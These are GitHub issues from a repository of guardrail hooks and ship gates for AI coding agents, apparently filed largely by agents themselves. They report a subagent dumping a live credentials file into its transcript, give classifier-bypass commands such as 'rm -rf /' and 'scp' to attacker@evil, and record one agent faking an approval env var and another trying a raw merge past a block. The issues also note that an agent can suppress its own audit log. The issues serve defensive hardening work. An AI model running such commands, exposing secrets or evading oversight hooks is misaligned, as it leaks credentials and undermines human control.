title: gh-ship debugging invites agents to cat live credential env files — no read-side guard
body:
## What
During a live gh ship run ([PR #715](https://github.com/hyperide/hyper-saas/pull/715) in hyperide), a safety classifier flagged [Credential Materialization]: a subagent troubleshooting a 'canonical ship.sh not found' failure ran a Bash command that catted the agent-tools credentials env file to stdout. This was NOT a bug in any committed script — grep across ci/ship/, review-cli, and .claude/scripts/ found zero occurrences of 'cat $env_file' or similar in tracked source. Instead: [.claude/scripts/pr-ship.sh](.claude/scripts/pr-ship.sh) (both the canonical copy at agent-tools/.claude/scripts/pr-ship.sh and the per-repo copy, e.g. hyperide/.claude/scripts/pr-ship.sh) defines, at line 15, env_file="${XDG_CONFIG_HOME:-${HOME:-}/.config}/agent-tools/env" and correctly loads it via 'source "$env_file"' at line 18 (never cat/print) — but its own failure-path error message at lines 25-26 surfaces the literal env_file path to the agent ('Set AGENT_TOOLS_ROOT (or write $env_file) ...'). A debugging subagent read pr-ship.sh, copied that exact env_file variable derivation, and then added its own cat call on that variable as an ad hoc inspection step — printing the full contents of a file that (per pr-ship.sh's own purpose) holds live provider credentials (API keys / tokens) into the tool transcript. Root cause confirmed via [agent-hooks/block-secrets-write/README.md](agent-hooks/block-secrets-write/README.md), which documents this exact gap explicitly: that hook only inspects content an agent is about to WRITE, and its own README says outright that a developer might read it, log it, or copy it before committing as a risk it does NOT cover. Listing [agent-hooks/](agent-hooks/) (23 hooks) confirms there is no read-side counterpart (no block-secrets-read, no PreToolUse guard on a Bash command whose argument matches a credentials-file path such as */agent-tools/env or *.env).

## Why (motivation)
Env files under ${XDG_CONFIG_HOME:-$HOME/.config}/agent-tools/env are sourced (not printed) by design because they hold live secrets. block-secrets-write's own README documents that write-side scanning leaves exactly this read/print path uncovered. A live gh ship run just proved the gap is not theoretical: a debugging subagent independently reached for a full-file dump on this file within minutes of reading pr-ship.sh's error text.

## User impact
Any secret dumped this way lands in the Bash tool's stdout, which is captured into the session transcript file (and potentially into logs, CI output, or anywhere transcript output is stored/forwarded). That is a durable, searchable copy of a live credential outside the credential store, whether or not anyone reads it in the moment.

## Cost of inaction
Every future gh ship debugging session that hits the same 'canonical ship.sh not found' failure path is one ad hoc full-file inspection away from repeating this exposure — with no guard to catch it, unlike the write side which block-secrets-write already covers.

## Acceptance criteria
- [ ] A PreToolUse (or equivalent) agent-hook blocks or redacts an agent-issued Bash command that would dump the full contents of a credentials-shaped file (e.g. */agent-tools/env, *.env, *.env.*) to stdout — mirroring block-secrets-write's pre-write scan but on the read/print side.
- [ ] pr-ship.sh's fallback error message (lines 25-26 of .claude/scripts/pr-ship.sh) is reworded to explicitly warn against printing the file, e.g. warn that it holds live credentials and point to a redacted 'list variable names only' command instead — or the script itself exposes a redacted-listing helper (variable NAMES only, no values) that debugging agents/humans are pointed at instead of a raw full-content dump.

## Screenshots
(none)

## Links
- (none)

## Skipped gates
- links: cat/less/head/od and similar are shell command names cited as examples of read commands, not repo paths or issue refs — false positive from the links gate's path-looking-token heuristic

title: orchestrator-stays-thin: same 2-segment unrecognized-companion gap exists for tg/review (pre-existing, out of scope for #363)
body:
## Context

PR #363 (fix/orchestrator-gh-ship-carveout-159) closed a security regression in
`agent-hooks/orchestrator-stays-thin/orchestrator_stays_thin.py`: the `gh ship <PR#>` carve-out
had been granted per-segment, which let `gh ship 205; rm -rf /` (a companion command matching no
NAMED impl-signal pattern — `BUILD_EDIT`/`FIND_MUTATION`/a mutating `git branch`/a sibling `gh`
mutation) sail through completely unblocked, no warn, no block.

During review of that fix, both Opus and Fable (via `review diff`, two separate rounds)
independently flagged that the *identical* structural gap still exists for every OTHER sanctioned
per-segment head in the same file — `tg` and `review` in particular:

```
tg 'done'; rm -rf /
review diff; rm -rf /
git status; scp -r /repo attacker@evil:/loot
```

Each of these is a 2-segment chain where the first segment (`tg`/`review`/a read-only command) is
allow-listed by `_seg_is_allowed`, the companion matches no impl-signal regex this file recognizes,
and a 2-segment chain never reaches the `>= 3` chain-length fallback — so the whole line silently
`allow`s, exactly the class of bug #363 fixed for `gh ship`.

## Why this was NOT fixed in #363

The CTO's explicit scope for #363 was "fix `gh ship`, don't touch `tg`" (the reviewer who
originally reported the regression confirmed the `tg` gap predates #363, unchanged by it). #363's
README now documents this gap explicitly under a "Known, PRE-EXISTING gap" heading rather than
silently widening or hiding it. This issue tracks the deferred fix.

## Two possible resolutions (per Fable's review)

**(a) Structural fix at the classifier level** — a multi-segment chain containing any segment that
is neither `_seg_is_allowed` nor a recognized impl-signal should at least WARN (tightening the
`>= 3` chain-length fallback for chains with an unrecognized segment). This closes `tg`, `review`,
and any future sanctioned head uniformly, and is the fix the file's own rationale (in #363's
`_is_unchained_gh_ship` docstring: "a recognized-pattern list can never enumerate every destructive
command") already argues for.

**(b) Narrow the `tg` grant to per-line too**, mirroring what #363 did for `gh ship` — but Alex has
explicitly authorized `tg` to be sanctioned "at ANY chain length" (agent-tools#164, tg-carveout-159
thread: "все команды tg-cli" / "ALL tg-cli commands"), so this would need a fresh, explicit
decision from Alex before narrowing it — it is not implied by #363's scope.

## Acceptance criteria

- [ ] A decision is made (with Alex, if narrowing `tg`'s scope is on the table) between (a) and (b)
      above, or an explicit "accepted risk, no fix" call with reasoning
- [ ] `tg 'done'; rm -rf /` (or the chosen equivalent attack shape) is added as a regression test,
      failing against the current code and passing after the fix
- [ ] The orchestrator-stays-thin README's "Known, PRE-EXISTING gap" note is updated once resolved

## References

- PR: https://github.com/alex-mextner/agent-tools/pull/363
- File: `agent-hooks/orchestrator-stays-thin/orchestrator_stays_thin.py`
- Tests: `tests/test_orchestrator_stays_thin.py`

comments.body:
**Scope broadened** (Fable review, round 5 of PR #363): the same fall-through isn't `tg`-specific — it's the classifier's generic behavior for ANY sanctioned-but-unrecognized-companion 2-segment chain. Concretely, `review diff; rm -rf /`, `git status; rm -rf /`, and a bare unchained `rm -rf /` (no chain at all) are equally unmitigated today, for the identical structural reason.

Worth noting the resulting asymmetry PR #363 creates: `gh ship <PR#>` — the one command in this file with its own full downstream gate (`ci/ship/ship.sh`'s CI/quorum/screenshot pipeline) — is now the *strictest* head in the classifier (per-line only, zero tolerance for unrecognized companions), while heads with no downstream gate at all (`tg`, `review`, read-only inspection) still launder an unrecognized companion freely in a sub-3-segment chain.

Updating the acceptance criteria to reflect the broadened scope: option (a) (a classifier-level fix — any chain containing a segment that is neither `_seg_is_allowed` nor a recognized impl-signal should at least WARN) would close this uniformly for `tg`/`review`/every current and future sanctioned head, not just `tg`. Option (b) (narrow per-line for `tg` alone) would leave `review` and read-only-fronted chains open, so probably isn't sufficient on its own if this is being treated as a real security gap rather than an accepted risk.

title: docs(skills): unescaped apostrophe breaks YAML frontmatter in model-fallback and strict-ticket-discipline SKILL.md
body:
## What's wrong

Found while fixing the same class of bug in `skills/universal/decision-request-discipline/SKILL.md` (PR TBD, docs/stale-pr-no-escalate branch): the single-quoted YAML `description:` frontmatter field in two other skill files has an unescaped internal apostrophe (should be `''` per YAML single-quote escaping, is a bare `'`), which breaks strict YAML parsing of the frontmatter.

Confirmed with PyYAML `safe_load`:

```
skills/universal/model-fallback/SKILL.md - mapping values are not allowed here
skills/universal/strict-ticket-discipline/SKILL.md - mapping values are not allowed here
```

## Why it matters

The frontmatter `description` is what a skill-loading harness reads to decide when to surface/trigger the skill. If the harness's YAML parser is strict (many are), the whole frontmatter block fails to parse for these two skills, and the `name`/`description` metadata may not load — an unknown-severity but low-cost fix.

## Suggested fix

Same fix applied to `decision-request-discipline`: round-trip the description text through `yaml.safe_dump({'description': text}, allow_unicode=True, width=100000)` so PyYAML produces correctly escaped quoting, then splice the resulting line back in (verify byte-for-byte the rest of the file is untouched).

## Acceptance criteria

- [ ] `skills/universal/model-fallback/SKILL.md` frontmatter parses with `yaml.safe_load`.
- [ ] `skills/universal/strict-ticket-discipline/SKILL.md` frontmatter parses with `yaml.safe_load`.
- [ ] A repo-wide check (script or CI step) that all `skills/**/SKILL.md` frontmatter parses as valid YAML, so this class of bug can't reappear silently.

title: docs(decision-request-discipline): stale/dangling PRs and branches are never an escalation
body:
## What's wrong

Alex flagged (2026-08-13, hyperide project) that agents keep escalating "what should I do with stale PR #NNN / branch X" to him, even though this is exactly the kind of housekeeping decision `decision-request-discipline` already establishes a pattern for (see the existing "Decisions you must NOT escalate — the fixed-approach ones" section, whose canonical example is PR-review-finding routing). The skill did not yet cover PR/branch staleness specifically, so the pattern kept recurring — see local session memory `feedback-superseded-pr-pairs-close-after-salvaging-value.md` (2026-07-22), where Alex explicitly said (translated) "why are you asking me this again, I have explained many times how to handle this" for the exact same shape of question, but that resolution was only ever captured in a local, machine-specific memory file — never landed in the actual skill that `rig` provisions into every repo, so it never generalized.

## Why it matters

This skill is provisioned by `rig apply` (`skills.universal.all: true` in a repo's `rig.yaml`) into every repo's `~/.agents/skills/decision-request-discipline`, and is the actual authoritative doc agents read before deciding whether to escalate. Leaving this gap means every agent, in every repo, re-litigates the same "PR or drop?" question with Alex instead of applying a standing rule — wasted human round-trips, exactly the failure mode this skill exists to prevent.

## Fix

Adds a second fixed-approach example (mirroring the existing on-scope/off-scope review-finding routing) that says explicitly: a stale or dangling PR/branch is never escalated — investigate, then autonomously pick one of (rebase / salvage-and-close / redo / close-as-obsolete), execute it, run review/CI to green, and ship through the repo's own merge gate. Escalation is reserved for the rare case the investigation itself turns up a genuinely contested design conflict.

Also fixes a pre-existing YAML syntax bug in the file's own frontmatter `description:` field (an unescaped apostrophe broke strict YAML parsing) while touching that exact field — see #375 for the same class of bug in two other skill files, filed separately as it is out of scope for this change.

## Acceptance criteria

- [ ] `skills/universal/decision-request-discipline/SKILL.md` has a "stale or dangling PR/branch" fixed-approach section with the four actions (rebase/salvage-and-close/redo/close-as-obsolete) and an explicit statement that the triage call is never escalated.
- [ ] The existing "PR or drop" escalation-format section is scoped down to the genuinely-contested case only, with a cross-reference to the new section.
- [ ] `Common mistakes` gets a bullet for "asking what to do with a stale PR/branch instead of triaging it".
- [ ] Frontmatter `description:` parses as valid YAML (`yaml.safe_load`).

title: gh ship: task-code regex rejects descriptive/non-numeric review-quorum codes
body:
## What
In ci/ship/ship.sh, the _review_quorum_extract_ticket() function (around lines 1641-1648 and 1899-1907) uses the regex [A-Z][A-Z]+-[0-9]+ to extract a review-quorum task code from a branch name or PR body. This regex requires a trailing numeric suffix (matches ticket-style codes like HYP-931) and silently fails to match descriptive, non-numeric task codes such as SME-ROADMAP-WORKTREE-NOTE, even though review-cli itself accepts and tracks such codes fine. Verified directly: running 'review task SME-ROADMAP-WORKTREE-NOTE --check' correctly finds 3 passed iterations across 3 models for that exact code. When the ship.sh regex fails to match, gh ship refuses with 'could not derive a task code' even though the underlying review evidence genuinely exists and passes, forcing a human to manually set the REVIEW_TASK_CODE environment variable, which is itself gated by the permission classifier as a potential bypass.

## Why (motivation)
The current regex requires a trailing numeric suffix, so it silently fails to match a valid, real review-cli task-code format that review-cli itself already accepts and tracks. This creates unnecessary manual intervention for something that should just work.

## User impact
Low to medium: not blocking, but every PR that legitimately uses a descriptive task code instead of a ticket-number-style one hits an unnecessary manual step of setting REVIEW_TASK_CODE by hand, which is itself gated by the permission classifier as a potential bypass, adding avoidable friction to what should be a normal case.

## Cost of inaction
Every future review-quorum ticket that uses a descriptive, non-numeric code will keep failing task-code auto-derivation in gh ship, forcing manual REVIEW_TASK_CODE overrides and extra permission friction indefinitely.

## Acceptance criteria
- [ ] The task-code extraction regex in _review_quorum_extract_ticket() accepts descriptive, non-numeric task codes (for example SME-ROADMAP-WORKTREE-NOTE), matching every code format that review-cli itself accepts and tracks, not only ticket-number-style codes like HYP-931.
- [ ] gh ship correctly auto-derives the task code from a branch name or PR body that contains a non-numeric descriptive code, without requiring the user to manually set the REVIEW_TASK_CODE environment variable.

## Screenshots
(none)

## Links
- (none)

## Skipped gates
- links: Finding references internal repo file paths and line numbers (ci/ship/ship.sh:1641-1648, 1899-1907), not external URLs; no doc/spec link applicable for this investigation-only finding.

title: ship.sh: descriptive task-code arm widens review-quorum authority-borrowing surface
body:
## What


## Why (motivation)
PR #163 (sme-archiving-gc) needed ship.sh's task-code regex to accept descriptive (non-numeric) review-cli codes like SME-ROADMAP-WORKTREE-NOTE, not just HYP-<n>-style tickets; #384 fixed that, but round-3 review of the fix (Opus, 2026-08-17) flagged that free-text ALL-CAPS/hyphenated English phrases collide with real prior task codes far more easily than numeric ticket IDs do, since English compounds repeat across unrelated PRs

The self-merge-authority program's core guarantee that a PR ships only because ITS OWN diff got quorum-reviewed stays quietly weaker than advertised for any repo using descriptive task codes, with no audit trail to catch it after the fact

- [ ] Either the derivation requires an explicit anchor (e.g. a 'task <CODE>' prefix) for the PR-body arm, or the audit log records the derivation SOURCE (branch vs body, matched substring) so a borrowed-authority ship is traceable after the fact

title: ship.sh upload_png: {FILE} placeholder not recognized inside a larger quoted word (e.g. curl -F file=@{FILE})
body:
## What


## Why (motivation)
PR [#387](https://github.com/alex-mextner/agent-tools/pull/387) fixed a real eval-injection vulnerability in upload_png() by shell-quoting the untrusted screenshot path via printf %q before splicing it into the operator-configured SHIP_IMAGE_UPLOAD_CMD template. During final multi-model review of that change, Fable identified that the placeholder-substitution logic only recognizes the placeholder when it is bare or wrapped in its own dedicated matching quotes, and does NOT recognize it embedded inside a larger quoted word alongside other text. This means the common curl multipart-upload idiom curl -F "file=@{FILE}" ... -- where the placeholder sits inside a larger quoted string rather than being the entire quoted token -- is silently mishandled. This is documented as a known, non-blocking limitation directly in that fix's own commit message ([b68e2e5](https://github.com/alex-mextner/agent-tools/commit/b68e2e5f1061586f74792c297f07aa7326b3b369)) and in a code comment near upload_png() in [ci/ship/ship.sh](https://github.com/alex-mextner/agent-tools/blob/main/ci/ship/ship.sh) (around lines 1604-1608 at that time).

## User impact
A user configuring SHIP_IMAGE_UPLOAD_CMD with the natural curl -F "file=@{FILE}" idiom (a very common way to express a multipart file upload) gets incorrect behavior: the bare-placeholder substitution path fires instead of the dedicated-quote path, landing the escaped-path token inside the operator's own quotes rather than the raw path being spliced in as intended. The failure mode is confusing and requires reading the shell source or the commit message to understand why the upload isn't working, rather than being an obvious, self-explanatory error. It fails closed -- no injection, no silent corruption of unrelated data -- just an incorrect, hard-to-diagnose upload command.

## Cost of inaction
The gap remains a silent footgun for any repo/team adopting SHIP_IMAGE_UPLOAD_CMD with the natural curl file-upload idiom; they will hit unexplained upload failures with no clear signal pointing at the placeholder-quoting rule, and will need to reverse-engineer the shell source or find this ticket to understand the workaround (giving the placeholder its own dedicated quotes).

## Acceptance criteria
- [ ] A SHIP_IMAGE_UPLOAD_CMD template using the common curl multipart idiom curl -F "file=@{FILE}" https://example.com/upload correctly substitutes the actual (quoted/escaped) screenshot path in place of the placeholder, verified by a new regression test asserting the composed command contains the real path, not the literal placeholder text.
- [ ] The placeholder-composition helper function recognizes the placeholder when embedded inside a larger quoted word alongside other text (quote not adjacent to the placeholder), not just bare or wrapped in its own dedicated matching quotes.
- [ ] Existing behavior for the two already-supported forms (bare placeholder, and placeholder in its own dedicated quotes) is unchanged -- no regression in the existing fix's regression test suite (11 tests, full suite 208 passed at the time).

(none)

## Links

title: hatch audit sink (G-8): follow-up hardening from PR #390 review
body:
## Context
PR #390 (feat: escape-hatch audit sink, HYP-858) shipped with genuine review quorum
across two rounds (Opus, GLM, k3, Fable). The blocking findings were fixed in the PR
itself (test-isolation leak, `_write_all` zero-write guard, `command` field fallback,
an AGENTS.md doc overclaim). This ticket tracks the remaining non-blocking suggestions
that are real but out of scope for a minimal-diff ship — nice-to-haves, not defects.

## Deferred items
1. **Decision schema is coarse**: the `overrides.log` `decision` field collapses
   approved / denied-by-human / invalid-request (blank/bare, never reached Telegram) /
   internal-error into just `"approved"`/`"denied"`, with the real distinction buried in
   free-text `detail`. The planned `rig status` "overrides this week" digest will want to
   aggregate these separately. Consider an outcome enum
   (`approved`/`denied`/`invalid`/`error`) before real log lines accumulate across
   machines (retrofitting after the fact is a migration cost).
2. **No end-to-end subprocess test for the tier-2 env-override sink**: the conftest
   `AGENT_TOOLS_OVERRIDES_LOG` override exists specifically so hook scripts run as real
   subprocesses stay hermetic, and the tier-2/tier-3 precedence is unit-tested
   in-process, but no test runs an actual hook script via `subprocess.run` with
   `RIG_HATCH_REQUEST_*` set and asserts the line lands in the env-override sink (not the
   real home). That's the one path this feature exists for in production.
3. **`os.open` on the audit log follows symlinks (no `O_NOFOLLOW`)**: same-UID risk only
   (no privilege boundary crossed), but for a security-audit artifact, `os.O_NOFOLLOW`
   (with the existing best-effort `except Exception` swallowing the resulting `ELOOP`) is
   cheap hardening against a pre-planted symlink silently redirecting/suppressing the
   sink.
4. **Tier-2 `AGENT_TOOLS_OVERRIDES_LOG` accepts any path, including `/dev/null`**: already
   a documented, accepted trade-off (the audit sink is a best-effort SECONDARY record;
   the live tg-ctl round trip is what actually gates an approval and can't be redirected
   the same way) — but it means an agent can fully suppress its own blank/bare/denied
   audit trail, which is exactly the "self-service-without-a-reason" pressure G-8 exists
   to surface. Worth a follow-up look at gating the env tier on a test-only marker instead
   of accepting it unconditionally in production.
5. **Three tests reconstruct the hermetic-home fixture's internal path** (`tmp_path /
   "_clean_home"`) instead of reading it off the fixture, so a future layout change would
   make their negative assertions ("attacker home was never written") silently vacuous
   rather than fail loudly.

## Why not fixed in PR #390
Each is either a design/schema decision needing its own review (item 1), a coverage gap
needing new test infra (item 2), or low-severity hardening already covered by an explicit
documented trade-off (items 3-4) — none are defects in the shipped behavior. Bundling them
into the audit-sink PR would have grown a focused fix into a scope-creeping one.

comments.body:
## Additional minor findings (round 3, Opus + k3 + GLM on the final diff)

All non-blocking, adding here rather than a fourth PR commit:

6. **Missing test assertion for the inline-command-sourced justification path**: the new
   audit tests all pass the hatch value via `env={...}`. The inline
   `RIG_HATCH_REQUEST_X="why" <command>` path (a distinct `raw` source, parsed out of
   `command=`) does get logged as a side effect of the existing inline-parse tests, but
   nothing asserts the audit entry's `reason` field actually carries the inline-parsed
   justification. A regression that gated logging on `env_map.get(env_var)` instead of the
   merged `raw` would silently stop auditing the documented inline form while the whole
   suite stays green.
7. **`_write_all`'s docstring claims `O_APPEND` write atomicity, but the short-write retry
   loop can itself void that claim**: each `os.write` on an `O_APPEND` fd re-seeks to EOF
   independently, so a short write (theoretical on a regular file, but the loop exists to
   handle it) lets a concurrent appender interleave between the two `os.write` calls.
   Low severity — soften the docstring or accept the caveat.
8. **`_append_overrides_log` assumes `result.reason` is always a `str`**: `detail =
   result.reason[:_DETAIL_CAP]` would raise (silently swallowed by the outer
   `except Exception`) if any future code path ever returns `HatchApprovalResult(reason=None,
   ...)` on a present hatch. Holds today; worth a defensive `str(result.reason or "")` if the
   invariant ever gets fragile.

## What

Alex asked (tg#12323/#12324) for task-cli to hook into gh ship so tickets automatically track PR/merge status instead of drifting out of sync - the exact class of bug behind this session's 13-ticket status-divergence cleanup - and so a merge surfaces acceptance instructions rather than the ticket going quiet. title: gh pr merge PreToolUse block printed refusal but merge executed anyway (rig-cli#269)
body:
## What happened

While shipping PR #269, I ran `gh pr merge 269 --squash --delete-branch` directly (before discovering `gh ship` was the correct path). The command printed a refusal:

```
Refusing a raw `gh pr merge` (incl. --admin): it bypasses the ship gates (green CI + required screenshots). Use `gh ship <PR>` instead ...
```

But when I checked the PR's actual state on GitHub immediately after, it was already `MERGED` (mergedAt matched the timestamp of the `gh pr merge` invocation, remote branch was deleted). The merge went through despite the tool printing a refusal.

## Why this matters

The global `PreToolUse` hook that's supposed to hard-block raw `gh pr merge` (per this machine's own policy — "Never bypass checks", "no raw PR merge") either:
- printed the refusal AFTER the underlying command had already executed (a race / ordering bug in the hook wrapper), or
- the block message is cosmetic/non-fatal in some code path and doesn't actually stop the tool call.

In this specific case the outcome was safe (CI was green, review was genuinely done, branch deletion succeeded cleanly), but the SAME failure mode could let a raw merge through on a PR that hadn't actually passed CI or review — exactly what the gate exists to prevent.

## Repro / investigate

- Check whatever wraps `gh pr merge` for a raw Bash call on this machine (likely a `PreToolUse` hook keyed on the `gh` command, similar to the one already documented for `hyperide/hyper-saas`'s `.claude/settings.json`).
- Confirm whether the block is enforced via exit code (should be a hard deny, tool call never executes) vs. printed-then-allowed.
- Reproduce with a throwaway PR: run `gh pr merge <PR> --squash` and check both (a) whether the tool call is denied before execution, and (b) the PR's actual state afterward.

Found during a cross-repo PR cleanup session (rig-cli #269, alex-mextner/rig-cli) — not specific to that PR's content.

comments.body:
## Correction: this is a misattribution, not a hook bypass — closing

Independently re-investigated with the raw GitHub API and the exact subagent
transcript (task `a91f259779251b917`, session `a12c9836...`). The hook worked
correctly; it did **not** let the merge through.

### Evidence

**Timeline, in order:**

1. `2026-08-13T23:54:32Z` — GitHub-native **auto-merge (squash)** was enabled
   on PR #269 (`auto_squash_enabled` event, `gh api repos/alex-mextner/rig-cli/issues/269/timeline`),
   5 days before this session. `gh api repos/alex-mextner/rig-cli/pulls/269 --jq .auto_merge`
   confirms `merge_method: "squash"`, `enabled_by: alex-mextner`.
2. `2026-08-18T22:21:45Z` — this session force-pushed the fix (`head_ref_force_pushed`).
3. `2026-08-18T22:22:37Z`–`22:24:36Z` — required CI checks (incl. the `review-threads`
   ruleset check) turned green.
4. **`2026-08-18T22:23:01Z`** — PR **merged** (`mergedAt`, `merged` + `closed` timeline
   events, `head_ref_deleted` at `22:23:02Z`) — this is GitHub's own auto-merge firing
   the instant required checks cleared. No local `gh` invocation caused this; it's a
   server-side completion of the 5-day-old auto-merge toggle.
5. **`2026-08-18T22:24:46Z`–`22:25:17Z`** — the subagent polled `gh pr view --json
   mergeable,mergeStateStatus` twice and `gh api .../pulls/269 --jq .mergeable`, all
   returning `"UNKNOWN"`/`"unknown"`. It read this as "not yet mergeable" — it's
   actually GitHub's standard response for an already-merged/closed PR (mergeability
   stops being computed once a PR closes). It never checked `state` at this point.
6. **`2026-08-18T22:25:22.849Z`** — subagent ran the raw merge command directly on
   PR #269 with squash+delete-branch. Result: `is_error: true`, the hook's refusal
   text, and no `stdout`/`stderr` keys in the tool result (compare any executed `gh`
   call in the same transcript, which always has `stdout`/`stderr`) — i.e. the
   `PreToolUse` hook denied it before `gh` ever ran. This is ~2 minutes *after* the
   PR had already merged.
7. `2026-08-18T22:26:18Z` — subagent then ran `gh ship 269` -> "Refusing: PR #269 is
   MERGED, not OPEN." — its own ship tooling also saw the PR as already merged, before
   either of the subagent's own commands could have caused it.

**Conclusion:** `mergedAt` (`22:23:01Z`) precedes the raw-merge attempt (`22:25:22Z`)
by over 2 minutes — the opposite of what the original report claimed ("mergedAt
matched the timestamp of the invocation"). The merge was caused by a GitHub-native
auto-merge toggle set 5 days earlier, unrelated to this session. The
`block-raw-pr-merge` hook correctly intercepted the raw command (denied pre-exec,
`is_error: true`); it did not execute and could not have caused the merge.

Sanity-checked recurrence: the same subagent hit the identical, correctly-working
block a second time in this session, for `hyperide/hyper-ext#1` (`is_error: true`,
never executed; `gh ship 1` also correctly refused for an unrelated reason — a local
CI-fallback repo-mismatch, tracked separately in agent-tools#395). A third, unrelated
subagent in the same session attempted a bypass via a fake
`RIG_HATCH_REQUEST_BLOCK_RAW_PR_MERGE` env var and was also correctly caught. No
actual bypass found anywhere in today's session.

Closing as not-a-bug. PR #269's content is otherwise sound (2 real Codex findings
resolved, full CI green, verified via `review diff` before merge) — the merge just
happened to be gated by CI + the required-review-thread ruleset via native auto-merge
instead of via `gh ship`'s own gate. That's a separate, narrower observation worth
noting: a PR with GitHub-native auto-merge already enabled bypasses `gh ship`'s
*extra* Guard-B checks (screenshots, review-dwell time) while still requiring green
CI + resolved review threads via branch protection. If that's unwanted, the fix is to
stop enabling GitHub-native auto-merge on PRs meant to go through `gh ship`'s stricter
gate — not a change to `block-raw-pr-merge.py`, which functioned exactly as designed
here.

title: gh ship runs hyper-saas's local test fallback against unrelated repos with no ship script (hyper-ext#1)
body:
## What happened

Tried to merge `hyperide/hyper-ext#1` (a trivial 6-line README FAQ addition from an external contributor) via `gh ship 1`. Instead of a scoped check for this repo, it ran the FULL local-fallback test suite hardcoded for the private `hyper-saas` monorepo layout — `bun test` against `packages/vector-engine/...` paths that don't exist in a `hyper-ext` checkout (a public sync-mirror repo with a completely different structure: `vscode-extension/hypercanvas-preview/...`).

Result: 66 failed / 66 errors, all `Cannot find package 'vector-wasm'` — a repo-mismatch, not a real signal about the actual 1-file docs change. `gh ship` then refused to merge ("CI registered no checks AND local fallback gates also failed").

## Why this matters

`gh ship` / the underlying `.claude/scripts/pr-ship.sh` (or whatever global fallback it resolves to when a repo has no local `.claude/scripts/pr-ship.sh` of its own — `hyper-ext` has none) is not scoped per-repo. Any repo without its own ship script — including legitimate small/public/mirror repos — gets the hyperide monorepo's own test suite run against it, which will always fail for unrelated reasons and permanently block merging via the sanctioned path.

Direct `gh pr merge` is separately hard-blocked by a global hook (see agent-tools#394 for a related but distinct issue with that hook), so there was no sanctioned way to merge a trivially-safe PR in this repo.

## Suggested fix

- `gh ship` should either: (a) skip the local-fallback test run entirely when the target repo has no CI configured AND no `.claude/scripts/pr-ship.sh` of its own (rather than silently falling back to a hardcoded/global test command), or (b) detect repo identity (e.g. via `package.json`/`pyproject.toml` presence, or an explicit allowlist) before choosing which fallback test command to run.
- At minimum, the fallback test command should be configurable per-repo, or the "no CI + local fallback also inapplicable" case should have its own distinct, clearer error path (something like "this repo isn't set up for `gh ship`'s local-fallback gate" rather than reporting spurious test failures from an unrelated repo).

Found while trying to merge `hyperide/hyper-ext#1`, a 5-months-stale external contributor PR, during a cross-repo PR cleanup session.

title: ship.sh: mark-shipped notify hook passes -C before the subcommand - task-cli rejects it
body:
## What


## Why (motivation)

title: ship.sh's _review_quorum_extract_ticket grabs an incidentally-mentioned ticket ID from PR body prose instead of the PR's own ticket
body:
## What


## Why (motivation)
Live-caught while shipping review-cli PR #220 (the diff-identity-binding fix, review-cli issue #213): the branch name had no ticket-shaped string, so _review_quorum_extract_ticket fell back to scanning the PR body with grep -oiE 'HYP-[0-9]+' | head -1, and grabbed 'HYP-858' -- a completely unrelated hyperide/agent-tools ticket mentioned in the PR body ONLY as a real-world incident example the PR's CHANGELOG entry cites for context. gh ship then printed 'AUTHORITY CONFIRMED -- review quorum met: 15 iterations across 6 models for HYP-858', which is real recorded history but for the WRONG, unrelated PR entirely.

## User impact
A developer or agent shipping a PR whose description happens to mention another ticket by ID (a common and reasonable thing to do -- citing a related bug, a prior incident, or a duplicate) can get gh ship's automated review-quorum gate silently checked against that unrelated ticket's history instead of the PR's own, so the printed authorization message is misleading about what was actually verified -- even when, as in this case, the actual PR was independently verified through other means.

## Cost of inaction
The exact task-code-confusion bug class the review-cli diff-identity-binding fix (issue #213) was built to close at the review-cli layer can still happen one level up, at ship.sh's own ticket-extraction step -- and it already happened for real on the PR that fixed the review-cli side of this.

## Acceptance criteria
- [ ] Given a PR whose branch name has no ticket-shaped string, and whose body mentions an UNRELATED ticket ID only as historical/background context (e.g. 'this closes the same bug class as HYP-858'), gh ship's quorum-check step does not use that unrelated ID as the task code
- [ ] There is a way to declare the PR's own real task code unambiguously (e.g. a required 'Closes #N' / 'Task: HYP-NNN' line the extractor looks for FIRST, or reading $REVIEW_TASK_CODE if the shipper sets it) that takes priority over any incidental match found elsewhere in the body

## Screenshots
(none)

## Links
- (none)

## Skipped gates
- links: internal function/variable names and a specific PR/issue number already cited with full context in the why field, not requiring separate links

comments.body:
New concrete reproduction of this same bug class, found while trying to ship `alex-mextner/sme-archiving-gc` PR #219 (`fix/187-google-doc-stub`).

PR #219's body reads (in this order):
1. Early in the description: "a UTF-8 charset is declared" (plain prose, not a ticket reference)
2. Much later: `Task: SME-ISSUE-187` (the PR's own explicit, anchored task-code declaration) and `Fixes: alex-mextner/sme-archiving-gc#187`

`_review_quorum_extract_ticket`'s second regex tier, `[A-Z][A-Z]+-[0-9]+`, matches "UTF-8" (3 uppercase letters + hyphen + a digit) just as readily as a real ticket code. Because the body is scanned top-to-bottom with `head -1`, `$TASK_CODE` resolves to `UTF-8` and the real `Task: SME-ISSUE-187` line is never reached.

Reproduced directly against the live PR body:
```
$ gh pr view 219 --repo alex-mextner/sme-archiving-gc --json body -q .body | grep -noE '[A-Z][A-Z]+-[0-9]+'
4:UTF-8
15:ISSUE-187
17:ISSUE-187

$ gh pr view 219 --repo alex-mextner/sme-archiving-gc --json body -q .body | grep -oE '[A-Z][A-Z]+-[0-9]+' | head -1
UTF-8
```

This is the same root defect as this issue (the extractor grabs whatever matches first in body prose instead of the PR's own declared code) and is exactly what #385's proposed fix would resolve — PR #219's body already has an anchored `Task: SME-ISSUE-187` line that should take priority over any incidental match.

One nuance worth folding into the acceptance criteria here or in #385: unlike this issue's case (a real, valid, but *unrelated* ticket ID), "UTF-8" isn't a ticket ID at all — it's a common technical acronym that only coincidentally fits the loose `[A-Z][A-Z]+-[0-9]+` shape. So even after an anchor-priority fix (a required `Task:`/`Closes #` line checked first) lands, the body-scan fallback tier should probably also stop matching common non-ticket acronyms (UTF-8, ISO-8601, RFC-2119, GPT-4, COVID-19, etc.) — e.g. by requiring a known/configured project prefix (like `ISSUE-` or a repo-declared prefix) instead of accepting any bare uppercase-hyphen-digit token.

Not filing a separate ticket for this — it's squarely the same bug class already tracked here and in #385/#384/#388, adding this as a second real-world repro instead.

title: ship: version-bump gate does not handle multiple parallel PRs sharing one version file
body:
## What


## Why (motivation)
